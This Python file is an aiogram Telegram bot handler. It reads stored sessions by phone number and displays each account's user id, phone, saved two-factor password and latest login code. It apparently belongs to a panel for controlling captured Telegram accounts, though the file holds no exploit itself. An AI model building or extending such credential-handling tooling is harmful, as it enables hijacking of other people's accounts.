from aiogram import types
from aiogram.dispatcher.filters import Text

from keyboards.inline.actions_kb import get_code
from loader import dp
from utils.db_commands import select_session
from utils.get_codes import get_codes_list


@dp.callback_query_handler(Text(startswith='get_codes'), state='*')
async def get_codes(call: types.CallbackQuery):
    await call.answer('⏳ Загрузка...')
    session = await select_session(int(call.data.split('|')[1]))
    codes = await get_codes_list(f'sessions/{session.phone}')

    if codes:
        codes_list = [
            f'Код: <code>{code.code}</code>\n'
            f'Дата: <code>{code.date}</code>' for code in codes
        ]
        password = f'🛡 Пароль: <code>{session.password}</code>\n\n' if session.password != '' else ''
        await call.message.edit_caption(
            f'👤 Пользователь: [<code>{session.user_id}</code>]\n'
            f'📞 Телефон: <code>+{session.phone}</code>\n\n'
            f'{password}'
            f'🔐 Последний код: \n{codes_list[0]}\n',
            reply_markup=get_code(session.id)
        )

    else:
        await call.message.answer(
            '<b>❌ Произошла ошибка при получении кодов!</b>'
        )
